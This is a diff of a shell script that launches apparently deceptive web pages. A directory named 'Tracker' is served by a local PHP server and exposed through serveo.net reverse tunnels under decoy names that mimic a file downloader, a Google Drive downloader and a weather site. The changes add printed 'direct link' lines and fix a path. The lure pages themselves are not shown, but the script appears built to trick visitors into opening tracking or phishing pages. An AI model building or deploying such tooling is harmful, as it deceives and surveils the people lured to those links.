@@ -28,7 +28,7 @@ filedownload(){
     php -S 127.0.0.1:8000
     echo "Starting serveo"
     ssh -R filedownloadersitex:80:127.0.0.1:8000 serveo.net
-    
+    echo "[+] Direct link: filedownloadersitex.serveo.net"
 }
 
 gdrive(){
@@ -40,10 +40,11 @@ gdrive(){
     echo "."
     echo "."
     echo "Starting PHP Server..."
-    cd /Tracker/gdrive
+    cd ../Tracker/gdrive
     php -S 127.0.0.1:8000
     echo "Starting serveo"
     ssh -R googledrivedownloaderx:80:127.0.0.1:8000 serveo.net
+    echo "[+] Direct link: googledrivedownloaderx.serveo.net"
     
 }
 
@@ -54,7 +55,7 @@ weather(){
     php -S 127.0.0.1:8000
     echo "Starting serveo"
     ssh -R weatherfindersitex:80:127.0.0.1:8000 serveo.net
-    
+    echo "[+] Direct link: weatherfindersitex.serveo.net"
 }
 
 
